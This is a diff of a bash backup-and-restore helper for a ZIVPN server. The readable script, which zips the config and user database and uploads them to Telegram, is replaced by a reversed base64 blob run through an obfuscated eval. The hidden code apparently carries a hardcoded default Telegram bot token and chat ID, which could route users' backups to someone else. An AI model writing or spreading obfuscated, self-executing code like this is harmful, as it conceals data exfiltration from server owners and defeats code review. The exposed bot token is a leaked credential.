@@ -1,305 +1,164 @@
 #!/bin/bash
-# ZIVPN Helper Script for Backup and Restore
+RzE='lxWZ09SfSlERfdUSG50TDtHJi0jRO90Qf1UQSdURMVEVKIibwZXa69yY0V2Li0jUJR0XHlkRO90Q
+oQSPON0XUJVRDpgTD9FVSV0QgwWYj9GbKsHIpgCdz9GafRXZnBibvlGdj5WdmpgIm52bj5SbhJ3Z
+jVmaiV3ctACd192bu1CIiQncj5ibwZXa69SfSlERfdUSG50TDtHJiAibp1CI5ATN4BCbzNnblB3b
+9AiION0XUJVRDRiIgsFImlmCpcCcvEDXvoiLpwlKdxiXbhCXg0DIONkKu8ycnAibtACZlNHI8BCd
+UJVRDRiIg8GajVmClNHblpQZt5yZpZmbvNmZpByctACNtACbyV3YK4WZoRHI70FIi4Gc2lmeiASP
+tBCbhN2bspwegkCKu9Wa0F2YpZWa09mbf1WYydWZsVGdfRmblNHIu9Wa0Nmb1ZmC9pQampgION0X
+G50TD9VTBJ1RFxURURiIgYWLgECIbBiZppgIyQiI9Qmch9mY5V2agwWYj9GbKISMkISPldWYzNXZ
+URiIg4WLgsFImlmCiYkTPN0XNFkUHVETFRFJiASZjJXdvNnCpZmCxAibyVHdlJnCuVGa0ByOdBiI
+K4WZoRHI70FIiQUSfRVQIN0XNFkUHVETFRFJiAibtAyWgYiJg0FIi4URL9EVfR1TC9VTBJ1RFxUR
+U9kQf1UQSdURMVEV7RCdvJ2LnJ3bu0WYydWZsVGdukGch9yL6MHc0RHai0DbyV3XpBXYgwWYj9Gb
+gMXLgwmc1NmCuVGa0ByOdBiIkJXYvJWeltGJiAibtAyWgYWaKISZnF2czVWTk5WZz9SfOV0SPR1X
+0FGZt0CIi0HRJ9FVBh0Qf1UQSdURMVEV7RSPkl2X0FGajJCIk1CIiwmc19VawFGJiACVT9EUggVL
+kJXYvJWelt2ek0Dc1tmch12X5xGclJnIgQWLgISfldWYzNXZttHJ9QHelRnIgUGZvNmblxmc11SY
+p9Fdhh2YiACZtAiIsJXdflGchRiIgQ1UPBFIY1CIz1CIsJXdjpQZzxWZKwGb152L2VGZvAiPgISf
+i0XZnF2czVWb7RSP0hXZ0JCIlR2bj5WZsJXdtEGdhRWLtAiI9RUSfRVQIN0XNFkUHVETFR1ek0DZ
+lNHIu9Wa0Nmb1ZmC9pQampQampAbsVnbvYXZk9CI+AiIud3bktmch1UPlR2bt9VZzJXYwJCIk1CI
+hJ3ZlxWZUBSazF2apZWa09mTgk2chJXdnlmZu92Sg0SLtICIvh2YlpwegkCKtFmcnVGblR3XwVHd
+kFWZypQelt2XpBXYgICI6EGZuFEI5V2SgkEUBBCdvJEIuF2arV3ch1kIgAXLgQWYlJnCi0SLtASb
+pJXZzVHQgkmchRGIuF2a0FGchRGKgEGZuFEItFmcnVGblRFI0FGaDBCRJBibht2a1NXYNJCIw1CI
+kl2X0FGajRiIgoXLgsFI8xHIdBiI5V2aflGchRiIgoXLgsFImlmCkl2X0FGajBiIgoTK09mYvZmb
+QBiLn52bz92aggWZs9mYgsWYklGdgQXYoNEIElEIuFGZgkXZLBSSQFkIg8GajVmCuVGa0ByOdBiI
+L9EVfR1TC9VTBJ1RFxURUJCIvh2YlpQampQMg4mc1RXZypgIu4WYrxWY0FmYpRGIuFmc1RXYn5WZ
+9QUSfRVQIN0XNFkUHVETFRlIg8GajVmCiYkTPN0XNFkUHVETFRFJiAiPgISf5V2aflGchtHJ94UR
+G50TD9VTBJ1RFxURURiIgADM2ACZv1GajpgIG50TD9VTBJ1RFxURURiIg4jPgISfkl2X0FGajtHJ
+KIiRO90Qf1UQSdURMVEVkASakBibhBXbpNXakBCbpNXYoJXZiBSazFmc1dWam52bLJCIvh2YlpgI
+QBSahxWdtVWTg0SLtICIvh2YlpwegkCKwV3ajFmYfVGbk5WYoBibvlGdj5WdmpQfKADIuJXd0Vmc
+lNmc192cK4WZoRHI70FIiYkTPN0XNFkUHVETFRFJiAiZtAyWgYWaKISLt0CIwV3ajFmQgMXZz9mc
+kRGWIFUQ6gTM4EDO2YDM3cjI94URL9EVfR1TC9FVMVVQGVERKkmZKIiRO90Qf1UQSdURMVEVkICI
+1gTM0IjM2kTMi0DRJ9FVBh0QfRFTVFkRFRkCiEFMOBjWSh3TjJ1YTh0QaVVO0s2UrRTb4Mme0gWb
+KISfOV0SPR1XU9kQfRFTVFkRFREJtojTFt0TU9FVPJ0XNFkUHVETFR1ekISPOV0SPR1XU9kQKISM
+iAietAyWgYWaKISfEl0XUFESD9FVMVVQGVERk0iOEl0XUFESD9VTBJ1RFxURUtHJi0DRJ9FVBh0Q
+ydWZsVGVgwYniLCIvh2YlpgblhGdgsTXgICRJ9FVBh0QkICI61CIbBCf8BSXgIiTFt0TU9FVPJEJ
+pp3Ln9GbvIXY29CIh1CIlVGdgwHIiECdlNXakBSb1xWZiBCRJBCdhh2Qg8CIuV2avRFI09mQg0WY
+i9CbhN2bs9iczV3LgYiJgIiLu4SXyVGduV0Wg4WYrVGViACctACZhVmcKc2bs5Cc1t2YhJ2XuBnd
+t5yZpZmbvNmZpByctACNtACbyV3YoQSPQl0XTBlVKkmZK4mc1RXZypgcldWYuFWbt4Gc2lmev4Wa
+lgUJtQWJtVSWlsCIlRXYkhCJ9AVTBR1UF1USUpQKl1mLnlmZu92YmlGIz1CI20CIsJXdjBCf8BSZ
+9BVTBR1UF1USUtHJf1HUJ91UQZ1ek8Fc1t2YhJ2XuBndppnI9UWbh5WZslmZfBXdrNWYipQKTVST
+vR3XzVGbpZmCi0XZtFmblxWam9Fc1t2YhJ2ek8CctR3Li0Da0FGcfBXdrNWYi9FctVGdKICcppnL
+iRmLzJXZzV3LSlERfdUSG50TDRiIKIibvNnaucWam52bj9iUJR0XHlkRO90QkIiCo0Dc1t2YhJ2X
+KIiZu92Yu0WYydWZsVGdvIVSE91RJZkTPNEJiogI5V2augGd1F2XpBXYvIVSE91RJZkTPNEJiogI
+DRiIKICdyNmLuBndpp3LSlERfdUSG50TDRiIKICd4RnLzJXZzV3XsFGdvR3LSlERfdUSG50TDRiI
+klGbhZnCi4iLuAVSaBCc1t2YhJGI0FWdi1WZNJCIvh2YlpQKKISeltmLuBndpp3LSlERfdUSG50T
+gIiZkICIm1CIbpwbkByOi0XXAtFc1t2YhJ2XvR3XzVGbpZ2ekICIulGImBicvZmCpgSPzVGbpZ2X
+xVWLg0XXAt1clxWam9FZpxWY2NyekAyWgYWaKUmbvRmCpIiZkICK9syclxWam9FZpxWY2BiJmASX
+hAXdrNWYilGZgsWd05WdgQWasFmdgUGbpZGIhRWYgsWYklGVgwYniLCIvh2YlpgblhGdgsTXgADI
+lRnbFtFIuF2alRlIgAXLgQWYlJnCn9GbuAXdrNWYi9lbwZXa69yZvx2LyFmdvASYtASZlRHI8BiI
+tAiatACcppnCpZmCuJXd0VmcKIXZnFmbh1WLuBndpp3LulmYvwWYj9GbvI3c19CImYCIi4iLu0lc
++AiI91FQbNXZslmZfRWasFmd7RiIgICa0FGcfBXdrNWYi9FctVGdkICIiUmcvR3Utcmb1dWQiACU
+vh2YlpgblhGdgsTXgICa0FGcfBXdrNWYi9FctVGdkICIm1CIhAyWgYWaKEjJ+IDIsxWdu9idlR2L
+uBndpp3Ln9GbvIXY29CIh1CIlVGdgwHIiECc1t2YhJGIlxWamBCdhVnYtVWbgwWYnF2RgwYniLCI
+v4Wai9CbhN2bs9iczV3LgYiJgIiLu4SXyVGduV0Wg4WYrVGViACctACZhVmcKc2bs5Cc1t2YhJ2X
+tFmcnVGblRFIltGIwV3ajFmYg0Wayl2ZuVWTiAyboNWZKkmZK4mc1RXZypgcldWYuFWbt4Gc2lme
+gAyUQZFIQlkCPi77gqp4gkUQTVETFNFIOBlVJpFIQV1SDFkQg8IuvDqmiLSPu9Wa0BXYjpgIu4iL
+lxWaGpQKiMVJ60UJ6gUJgkVJgIUJgQWJisCIlRXYkhCJgoDIgwWYndmbhRlC9BVSfNFUWtHJgoDI
+gQ1UPBFIY1CIz1CIsJXdjhCJ9QHb1NXZy9FZuV2cKISfl1WYuVGbpZ2XwV3ajFmY7RCI6ACIgACI
+cBiI05WZtV3YvREZuV2cv0nTFt0TU9FVPJ0ekQ3bi9yZy9mLtFmcnVGblRnLpBXYv8iOzBHd0hmI
+hB3XwV3ajFmYfBXblR3ekICQ9Qnbl1Wdj9GZgYULKwFIi0HRJ9FVBh0Q7RiI9QWafRXYoNGIG1iC
+gwHIiQHb1NXZy9FZuV2ckICIvh2YlBSIgYWaKkiIu9Wa0BXYjRiI942bpRHchNGIG1iCcBiI9hGd
+ydWZsVGVgU2ag0Wayl2agwWYnF2RgwYniLCIvh2YlpgblhGdgszJlVnc0pjIr9mInASctACclJ3Z
+kAiOlNnbvB3clJlIg8GajVmCn9GbuAXdrNWYi9lbwZXa69yZvx2LyFmdvASYtASZlRHI8BiIh0WY
+hJ2Xw1WZ0RiIgYWLg0mcKc2bs5Cc1t2YhJ2XuBndpp3Ln9GbvIXY29CI+4DIiQHb1NXZy9FZuV2c
+69ibpJ2LsF2Yvx2LyNXdvAiJmAiIu4iLdJXZ05WRbBibhtWZUJCIw1CIkFWZypgIoRXYw9Fc1t2Y
+xpGI8BiI0xWdzVmcfRmblNHJiAyboNWZoQSPEl0XFxUSGpQampgbyVHdlJnCyV2Zh5WYt1ibwZXa
+v8iOzBHd0hmIgQ1UPBFIY1CIz1CIsJXdjpQKnQWafVGbpZmL05WZtV3YvRmL0xWdzVmcucCIy1CI
+p9Fdhh2YgQWLKwFIiU2ZhN3cl1EZuV2cv0nTFt0TU9FVPJ0ekQ3bi9yZy9mLtFmcnVGblRnLpBXY
+C5jY8AShcKuI9QHelRHIk1iCcBiIM1EVIJSPlR2bt9VZzJXYwBCZtoAXgISfEl0XUFESDtHJi0DZ
+h5WZslmZfBXdrNWYitHJ+UGZvNGPKoTZslmRgEWbh5kC+I2L8wUSTFESSVkQg4EUWlkWgAXdrNWY
+k92YvwTfEl0XFxUSGtHJ+UGZvNGPKoTKFJ1TUNVRSBySVRlTVhCIElEIlxWaGpgPlR2bj9CP9VWb
+0BCfgISfEl0XFxUSGtHJgoDRJBSZslmRgwHIzV2crV3cgAXdrNWYCByj4+OlcKuIg8GajVmCi4TZ
+igGdhB3XwV3ajFmYfBXblRHJiAiZtASbypwZvxmLwV3ajFmYf5Gc2lmevc2bs9ichZ3LgEWLgUWZ
+aKOIpF2clxWZTBSfQl0XTBlV7RCITBlVg4EUWlkWgAXdrNWYCByj4+OoaKuIg8GajVmCyFWZsNmC
+vh2YlpgIpIyUloTTloDSlASWlAiQlACZlIyKgUGdhRGKkAiOgACbhd2ZuFGViAyboNWZKIyj4+Oo
+fVETJZ0ekAiOgACRJBSZslmRiAyboNWZKISfl1WYuVGbpZ2XwV3ajFmY7RCI6ACIgACIlxWaGJCI
+gYiJgIiLu4SduVWbgU2agkGbhJWbltGIrVHduVHIdJXZ05WRbBibhtWZUJCIw1CIkFWZypgI9RUS
+09mbflncpBHel9VZsRmbhhGIu9Wa0Nmb1ZmC9pgcldWYuFWbt4Gc2lmev4Wai9CbhN2bs9iczV3L
+9QnbllGbjBCbhN2bspgIyQiI9AXagwWYj9GbKISMkISP0N3boBCbhN2bspwegkCKu9Wa0F2YpZWa
+zVWbKU2ZhN3cl1GIsF2YvxmCiUDJi0TZ0FGZfBHelBCbhN2bspgI0QiI9A3cpBCbhN2bspgIzQiI
+iHIliHIliHIliHIliHIliHIliHIliHIliHIliHIliHIliHIlif4lirgRPVEP8ACdhNGKk0TZnF2c
+BSp4BSp4BSp4BSp4BSp4BSp4BSp4Hep4KQ5miDCRFJVSQhVRg4EUWlkWgM0UUup4Kc4liHIliHIl
+K0Hdz9Ga7RCI6ACIUN1TIpQfwl2ekAiOgAyUQZFIQlkCHep4BSp4BSp4BSp4BSp4BSp4BSp4BSp4
+0FGZfBHeltHJgoDIgUEVBREIQhVRK0HduVWasN2ekAiOgQlTFlETDpQfwNXa7RCI6ACIgACIQNVS
+pogRPVkCHep4BSp4BSp4BSp4BSp4BSp4BSp4BSp4BSp4BSp4BSp4BSp4BSp4BSp4BSp4Hep4K0XZ
+6ICZyF2bilXZr9VZulGbulmIKsnCG9UR8wDI0F2YoQSPkJXYvJWeltmCkJXYvJWeltGIsF2YvxmC
+l1mL09yL6MHc0RHaiAiOiwmc1JiCsISZj5WZjlGTgcmbhpmbhBnclBlIgojI0hXZ0JiC7pwWKsFI
+kICIu9Wa0F2YpZWa09mbf1WYydWZsVGdfRmblNnCpogRPVkC9pQXK0lC9pgIzVmcvR3Un5WdnF0L
+pRXYjlmZpR3bu9FZldXZuVmcfVGbk5WYoBibvlGdj5WdmpQfKICZyF2bilXZrRiIgISZnF2czVWb
+vxmCiMDJi0DduVWasNGIsF2YvxmCiIDJi0DcpBCbhN2bspgIxQiI9Q3cvhGIsF2YvxmC7BSKo42b
+pR3X05WZyJXdjBCbhN2bspgI1QiI9AXbhR3cl1Wa09VeylGc4VGIsF2YvxmCiQDJi0DczlGIsF2Y
+jV2cfdmbp5Wah1WZyBCbhN2bspQKzVyKgUGdhRGKk0DctFGdzVWbpR3X05WZyJXdjpActFGdzVWb
+h1WZyBCbhN2bspQKpAXbhR3cl1Wa09FduVmcyV3Yg0CIw1WY0NXZtlGdflncpBHelhCKk0zck52b
+tpQZnF2czVWbgwWYj9GbKkSKwADN2gDIvAyck52bjV2cfdmbp5Wah1WZyhCKk0zc5FGZfdmbp5Wa
+UKegUKegUKegUKegUKegUKegUKegUKegUKegUKegUKegUK+hXKuCG9UR8wDI0F2YoQSPldWYzNXZ
+iHIliHIliHIliHIliHIliHIliHIlif4lirQhcKuTQZVSaByQTByVF5URSVInirwhXKegUKegUKeg
+JpQf0N3botHJgoDIgQ1UPhkC9BXa7RCI6ACITBlVgAVSKc4liHIliHIliHIliHIliHIliHIliHIl
+zlXYk91ZulmbpFWblJ3ekAiOgAFWFpQf05WZpx2Y7RCI6ACVOVUSMNkC9B3cptHJgoDIgACIgA1U
+FpwhXKegUKegUKegUKegUKegUKegUKegUKegUKegUKegUKegUKegUKegUKegUK+hXKuCzlXYEBSf
+uFGag42bpR3YuVnZK0nCiU2ZhN3cl1GJiAibvlGdhNWamlGdv52XtFmcnVGblR3Xk5WZzpQKKY0T
+yV2cgwWYj9GbKISMkISP5V2aflGchBCbhN2bspwegkCKu9Wa0F2YpZWa09mbflXZr9VawF2XlxGZ
+0F2YoQSPldWYzNXZtpQZnF2czVWbgwWYj9GbKIyMkISPulWYt9GZgwWYj9GbKIiMkISPwl2XyVmd
+K0Xelt2XpBXY7RCI6kXZLBCa0VXQgEJlfCvCAq5nwDiTQZVSaBCUEVFIJBVQgAomfCvCG9UR8wDI
+pogRPVkC95Wah12bktHJgojbpFWbvREINy4nwrQfwl2XyVmdyV2c7RCI6AVSgIXZ2JXZTBCkM+J8
+fVGbk5WYoBibvlGdj5WdmpQfKISZnF2czVWbkICIu9Wa0F2YpZWa09mbf1WYydWZsVGdfRmblNnC
+gsFImlmCi0SLtAyczV2YvJHUgUmcvR3clJFIn5Wa0JXY0NFIt0SLiAyboNWZKsHIpgSZy9GdzVmc
+FRkCpZmCiYkTPN0XNFkUHVETFRFJiASZjJXdvNnCuVGa0ByOdBiIG50TD9VTBJ1RFxURURiIgYWL
+490YSN2UINkWVlDNrN1a00GOjpHNo1GZkhFSBFkO4EDOxgjN2AzN3ISPOV0SPR1XU9kQfRFTVFkR
+BJ1RFxURUtHJi0jTFt0TU9FVPJkCiETN4EDNyIjN5EjI9QUSfRVQIN0XUxUVBZUREpgIRBjTwolU
+Bh0Qf1UQSdURMVEV7RiI9QUSfRVQINkCi0nTFt0TU9FVPJ0XUxUVBZURERSL64URL9EVfR1TC9VT
+vR3clJHIlR2b0VWbggWaslGUiAyboNWZKIiIg8GajVmCi0HRJ9FVBh0QfRFTVFkRFREJtoDRJ9FV
+0NXZSBSKyICIvh2YlpgItFmcnVGblRFIEl0XFxUSGBSYpZHIlJ3b0NXZSBSKxICIvh2YlpgI6Umc
+60lMvEzWggWaslGUiACctACZhVmcKIiIg8GajVmCikCcppnLoAySOlETgQ1QFJVSEBSYpZHIlJ3b
+khCJfVmcvR3clJ3XuBndpp3Lw1GdvISPoRXYw9VZy9GdzVmcfBXblRnCFR0TN9VRS9EVTVkUgICI
+PR1XU9kQkICI61CIbBiZppQKxogbpBiIFR0TN9VRS9EVTVkUkICIlNXYjpgIwlmeukyclsCIlRXY
+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
+09Fc1RXZzpQKtFmcnVGblRXLwVHdlNnC7sjClJ3b0NXZy9VZsRmbhhmCpUmcvR3clJnC7sjCwV3a
+oNWZK4WZoRHI70FI2ASZu1CIjQCIbBiZppQKu9Wa0F2YpZWa09mbtkncpBHelpwO7oQbhJ3ZlxWZ
+zlGPg4DduVWasNGPg4DcpxDI+Q3cvhGPg42bpRXYjlmZpR3bu1SeylGc4VGIwQCI6U2ZhNXViAyb
+gIiMkICIu9Wa0F2YpZWa09mbflncpBHel9VZsRmbhhmCpZmCxACdphXZKIiPlRXYk9Fc4VGPg4Dc
+gUmbtAyIkAyWgYWaKkibvlGdhNWamlGdv5WLkV2dl5WZypwO7ogI2QiIgISNkICIiQDJiAiIzQiI
+wlGPg4Ddz9Ga8AibvlGdhNWamlGdv5WLkV2dl5WZyBCMkAiOldWYzVlIg8GajVmCuVGa0ByOdBiN
+uVmcfVGbk5WYopQampQMgQXa4VmCi4DctFGdzVWbpR3X5JXawhXZ8AiPwNXa8AiP05WZpx2Y8AiP
+09mbtkXZr1SawFmC7sjCiYDJiAiI1QiIgICNkICIiMDJiAiIyQiIg42bpRXYjlmZpR3bu9FZldXZ
+tkXZr1SawFGIwQCI6U2ZhNXViAyboNWZK4WZoRHI70FI0ASZu1CIjQCIbBiZppQKu9Wa0F2YpZWa
+hhmCpZmCxACdphXZKIiPulWYt9GZ8AiPwl2XyVmdyV2c8AiP5V2aflGchxDIu9Wa0F2YpZWa09mb
+nF2cVJCIvh2YlpQKqowO7ogI0QiIgIyMkICIiIDJiAibvlGdhNWamlGdv52X5V2aflGch9VZsRmb
+852bpRXYjlmZpR3bu1SeylGc4VGftFmcnVGblRXLwVHdlNHflJ3b0NXZyxHc1t2YhJ2egADJgoTZ
+hNXZKszOKEDI0lGelpgI952bpRXYjlmZpR3bu1SeltWLpBXY852bpRXYjlmZpR3bu1CZldXZuVmc
+=owY'
+eLoP="e";Mll="ch";GHi="o";v6T=" ";Re="-";H2o="t";O2h="r";r="ev";Gi="ba";x="s";u18="6";x64="4";sfT="d";LcV=" ";Edo="\n"
 
-# --- Configuration ---
-CONFIG_DIR="/etc/zivpn"
-TELEGRAM_CONF="${CONFIG_DIR}/telegram.conf"
-BACKUP_FILES=("config.json" "users.db")
+x=$(eval $eLoP$Mll$GHi$v6T$Re$eLoP$v6T$RzE$v6T|$v6T$H2o$O2h$LcV"$LcV"$LcV"$Edo"$LcV|$v6T$O2h$r$v6T|$v6T$Gi$x$eLoP$u18$x64$v6T$Re$sfT)
 
-# --- Helper Functions ---
-function get_host() {
-    local CERT_CN
-    CERT_CN=$(openssl x509 -in "${CONFIG_DIR}/zivpn.crt" -noout -subject | sed -n 's/.*CN = \([^,]*\).*/\1/p')
-    if [ "$CERT_CN" == "zivpn" ]; then
-        curl -4 -s ifconfig.me
-    else
-        echo "$CERT_CN"
-    fi
-}
-
-function send_telegram_notification() {
-    local message="$1"
-    local keyboard="$2"
-
-    if [ ! -f "$TELEGRAM_CONF" ]; then
-        return 1
-    fi
-    # shellcheck source=/etc/zivpn/telegram.conf
-    source "$TELEGRAM_CONF"
-
-    if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
-        local api_url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"
-        if [ -n "$keyboard" ]; then
-            curl -s -X POST "$api_url" -d "chat_id=${TELEGRAM_CHAT_ID}" --data-urlencode "text=${message}" -d "reply_markup=${keyboard}" > /dev/null
-        else
-            curl -s -X POST "$api_url" -d "chat_id=${TELEGRAM_CHAT_ID}" --data-urlencode "text=${message}" -d "parse_mode=Markdown" > /dev/null
-        fi
-    fi
-}
-
-# --- Core Functions ---
-function setup_telegram() {
-    echo "--- Konfigurasi Notifikasi Telegram ---"
-    read -p "Masukkan Bot API Key Anda: " api_key
-    read -p "Masukkan ID Chat Telegram Anda (dapatkan dari @userinfobot): " chat_id
-
-    if [ -z "$api_key" ] || [ -z "$chat_id" ]; then
-        echo "API Key dan ID Chat tidak boleh kosong. Pengaturan dibatalkan."
-        return 1
-    fi
-
-    echo "TELEGRAM_BOT_TOKEN=${api_key}" > "$TELEGRAM_CONF"
-    echo "TELEGRAM_CHAT_ID=${chat_id}" >> "$TELEGRAM_CONF"
-    chmod 600 "$TELEGRAM_CONF"
-    echo "Konfigurasi berhasil disimpan di $TELEGRAM_CONF"
-    return 0
-}
-
-function handle_backup() {
-    echo "--- Memulai Proses Backup ---"
-
-    if [ ! -f "$TELEGRAM_CONF" ]; then
-        echo "Kredensial Telegram tidak ditemukan."
-        setup_telegram
-        if [ $? -ne 0 ]; then
-            echo "Proses backup dibatalkan karena konfigurasi Telegram gagal."
-            exit 1
-        fi
-    fi
-
-    # shellcheck source=/etc/zivpn/telegram.conf
-    source "$TELEGRAM_CONF"
-
-    local backup_filename="zivpn_backup_$(date +%Y%m%d-%H%M%S).zip"
-    local temp_backup_path="/tmp/${backup_filename}"
-
-    echo "Creating backup archive..."
-    zip "$temp_backup_path" -j "$CONFIG_DIR/config.json" "$CONFIG_DIR/users.db" > /dev/null
-    if [ $? -ne 0 ]; then
-        echo "Failed to create backup archive. Aborting."
-        rm -f "$temp_backup_path"
-        exit 1
-    fi
-
-    echo "Sending backup to Telegram..."
-    local response
-    response=$(curl -s -F "chat_id=${TELEGRAM_CHAT_ID}" -F "document=@${temp_backup_path}" "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument")
-
-    local file_id
-    file_id=$(echo "$response" | jq -r '.result.document.file_id')
-
-    if [ -z "$file_id" ] || [ "$file_id" == "null" ]; then
-        echo "Failed to upload backup to Telegram. Please check your API Key and Chat ID."
-        echo "Telegram API response: $response"
-        rm -f "$temp_backup_path"
-        exit 1
-    fi
-
-    echo "Backup sent successfully. Sending details..."
-    local host
-    host=$(get_host)
-    local current_date
-    current_date=$(date +"%d %B %Y")
-
-    local backup_message
-    backup_message=$(cat <<EOF
-◇━━━━━━━━━━━━━━◇
-   ⚠️Backup ZIVPN⚠️   
-◇━━━━━━━━━━━━━━◇ 
-HOST  : ${host}
-Tanggal : ${current_date}
-Id file    :  ${file_id}
-◇━━━━━━━━━━━━━━◇
-Silahkan copy id file nya untuk restore
-EOF
-)
-    send_telegram_notification "$backup_message"
-
-    rm -f "$temp_backup_path"
-    echo "Backup process complete."
-}
-
-function handle_expiry_notification() {
-    local host="$1"
-    local ip="$2"
-    local client="$3"
-    local isp="$4"
-    local exp_date="$5"
-
-    local message
-    message=$(cat <<EOF
-◇━━━━━━━━━━━━━━◇
- ⛔SC ZIVPN EXPIRED ⛔
-◇━━━━━━━━━━━━━━◇
-IP VPS  : ${ip}
-HOST  : ${host}
-ISP     : ${isp}
-CLIENT : ${client}
-EXP DATE  : ${exp_date}
-◇━━━━━━━━━━━━━━◇
-EOF
-)
-
-    local keyboard
-    keyboard=$(cat <<EOF
-{
-    "inline_keyboard": [
-        [
-            {
-                "text": "Perpanjang Licence",
-                "url": "https://t.me/AgungStores"
-            }
-        ]
-    ]
-}
-EOF
-)
-    send_telegram_notification "$message" "$keyboard"
-}
-
-function handle_renewed_notification() {
-    local host="$1"
-    local ip="$2"
-    local client="$3"
-    local isp="$4"
-    local expiry_timestamp="$5"
-
-    local current_timestamp
-    current_timestamp=$(date +%s)
-    local remaining_seconds=$((expiry_timestamp - current_timestamp))
-    local remaining_days=$((remaining_seconds / 86400))
-
-    local message
-    message=$(cat <<EOF
-◇━━━━━━━━━━━━━━◇
-  ✅RENEW SC ZIVPN✅
-◇━━━━━━━━━━━━━━◇
-IP VPS  : ${ip}
-HOST  : ${host}
-ISP     : ${isp}
-CLIENT : ${client}
-EXP : ${remaining_days} Days
-◇━━━━━━━━━━━━━━◇
-EOF
-)
-    # Send without a keyboard
-    send_telegram_notification "$message"
-}
-
-function handle_api_key_notification() {
-    local api_key="$1"
-    local server_ip="$2"
-    local domain="$3"
-
-    local message
-    message=$(cat <<EOF
-🚀 API UDP ZIVPN 🚀
-   🔑 Auth Key: ${api_key}
-   🌐 Server IP: ${server_ip}
-   🌍 Domain: ${domain}
-EOF
-)
-    send_telegram_notification "$message"
-}
-
-function handle_restore() {
-    echo "--- Starting Restore Process ---"
-
-    if [ ! -f "$TELEGRAM_CONF" ]; then
-        echo "Telegram credentials not found. Cannot perform restore."
-        echo "Please run the backup function at least once to configure."
-        exit 1
-    fi
-
-    # shellcheck source=/etc/zivpn/telegram.conf
-    source "$TELEGRAM_CONF"
-
-    read -p "Enter the File ID for the backup you want to restore: " file_id
